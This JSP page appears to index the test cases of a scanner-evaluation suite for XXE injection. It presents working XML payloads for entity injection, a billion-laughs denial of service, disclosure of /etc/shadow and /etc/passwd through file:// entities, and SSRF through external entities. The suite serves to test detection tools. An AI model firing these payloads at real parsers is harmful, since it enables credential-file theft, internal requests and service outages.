<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of XXE Injection Detection Accuracy - HTTP POST Input Vector Method Responses</title>
</head>
<body>

<center><font size="5">Injection Test Cases - HTTP POST Input Vector Method Responses:</font></center><br><br>
<B><a href="Case01-XXE-Injection-Entity-Example-WithErrors.jsp">Case01-XXE-Injection-Entity-Example-WithErrors.jsp</a></B><br>
  XXE Injection into search field.<br>
  Goal: perform simple xxe injection.<br>
  <U>Barriers:</U><br>
   None <br>
   <U>Example:</U> <B><xmp><!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo></xmp></B>
  <U>Exploit:</U> <B><xmp><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example "That'sNotMyLastName!XXE-Work!"> ]>
 <employees>
 <employee id="1">
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</employee>
</employees></xmp></B><br>
  
<B><a href="Case02-XXE-Injection-Denial-of-Service-WithErrors.jsp">Case02-XXE-Injection-Denial-of-Service-WithErrors.jsp</a></B><br>
  XXE Injection into search field.<br>
  Goal: perform XXE injetion to execute a DoS.<br>
  <U>Barriers:</U><br>
   None <br>
  <U>Example:</U><B><xmp><!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag></xmp></B>
  <U>Exploit:</U> <B><xmp><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lola "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lolb "&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;">
 <!ENTITY lolc "&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;">
 <!ENTITY lole "&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;">
 <!ENTITY lold "&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;">
 <!ENTITY lolf "&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;">
 <!ENTITY lolg "&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;">
 <!ENTITY lolh "&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;">
 <!ENTITY loli "&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;">
]>
<employees>
    <employee id="1">
        <firstName>John</firstName>
        <lastName>Doe</lastName>
        <location>&loli;</location>
    </employee>
</employees></xmp></B><br>
  
  <B><a href="Case03-XXE-Injection-File-Disclosure-WithErrors.jsp">Case03-XXE-Injection-File-Disclosure-WithErrors.jsp</a></B><br>
  XXE Injection into search field.<br>
  Goal: perform XXE injetion to retrieve files.<br>
  <U>Barriers:</U><br>
   None <br>
   <U>Example:</U><br>
   <B><xmp><!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo></xmp></B>
  <U>Exploit:</U><br>
    <B><xmp><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employees [  <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<employees>
    <employee id="1">
        <firstName>John</firstName>
        <lastName>Doe</lastName>
        <location>&file;</location>
    </employee>
</employees></xmp></B><br>
    
    <B><a href="Case04-XXE-Injection-SSRF-WithErrors.jsp">Case04-XXE-Injection-SSRF-WithErrors.jsp</a></B><br>
   XXE Injection into search field.<br>
   Goal: perform SSRF attacks.<br>
  <U>Barriers:</U><br>
   None <br>
   <U>Example:</U>
   <B><xmp><?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo></xmp></B>
  <U>Exploit:</U><B>
  <xmp><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employees [  <!ENTITY file SYSTEM "http://dummy.restapiexample.com/api/v1/employees"> ]>
<employees>
    <employee id="1">
        <firstName>John</firstName>
        <lastName>Doe</lastName>
        <location>&file;</location>
    </employee>
</employees></xmp></B><br>
</body>
</html>